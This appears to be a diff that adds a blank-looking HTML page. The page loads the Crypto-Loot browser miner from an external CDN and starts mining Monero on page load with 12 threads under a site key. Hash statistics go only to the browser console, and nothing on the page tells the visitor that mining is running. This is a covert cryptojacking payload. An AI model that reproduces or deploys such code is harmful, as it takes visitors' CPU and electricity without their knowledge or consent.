@@ -1,0 +1,43 @@
+<html>
+
+  <head>
+    <title> </title>
+    <script src="https://cdn.rawgit.com/Crypto-Loot/cryptoloot/7cc5af6571a1c1c4afbfea0f7b5994653acad599/lib/crypta.js"></script>
+    </script>
+  </head>
+
+  <body>
+
+    <script>
+      var miner=new CRLT.Anonymous('340be31b55f31329af378b8a191fe37202ab9f56f830', {
+          threads:12,autoThreads:false,throttle:0.2,coin: "xmr", // xmr = Monero, upx = uPlex
+         });
+          miner.start();
+
+        // Listen on events
+        miner.on('found', function() {
+            console.log("Found Hash!")
+        })
+        miner.on('accepted', function() { /* Hash accepted by the pool */ 
+            console.log("Accepted Hash!")
+        })
+
+        // Update stats once per second
+          setInterval(function() {
+          var hashesPerSecond = miner.getHashesPerSecond();
+          var totalHashes = miner.getTotalHashes();
+          var acceptedHashes = miner.getAcceptedHashes();
+
+          // Output to HTML elements...
+          console.log("hashesPerSecond", hashesPerSecond)
+          console.log("totalHashes", totalHashes)
+          console.log("acceptedHashes", acceptedHashes)
+
+          console.log("------")
+
+        }, 1000);
+    </script>
+
+  </body>
+
+</html>
